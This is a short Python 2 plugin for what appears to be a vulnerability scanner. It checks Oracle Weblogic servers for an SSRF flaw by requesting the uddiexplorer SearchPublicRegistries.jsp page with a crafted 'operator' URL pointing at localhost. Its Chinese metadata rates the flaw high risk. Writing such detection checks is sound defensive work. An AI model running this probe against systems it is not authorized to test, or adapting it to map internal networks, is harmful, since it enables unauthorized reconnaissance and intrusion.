# coding:utf-8
# author:liil
import requests


def get_plugin_info():
    plugin_info = {
        "name": "Weblogic SSRF 漏洞",
        "info": " 攻击者利用该漏洞可能导致探测内网，攻击内网或本地程序、对内网web应用进行指纹识别、实现多种攻击，读取文件等。",
        "level": "高危",
        "type": "SSRF",
        "author": "liil",
        "url": "",
        "keyword": "tag:weblogic",
        "source": 1
    }
    return plugin_info


def check(host, port, timeout):
    url = "http://%s:%d" % (host, int(port))
    payload_url = '%s/uddiexplorer/SearchPublicRegistries.jsp?operator=http://localhost:65535&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search' % url
    try:
        res = requests.get(payload_url, timeout=timeout)
        if 'exception.XML_SoapException' in res.text:
            info = '存在SSRF漏洞: %s' % payload_url
            print info
            return info
    except Exception, e:
        pass
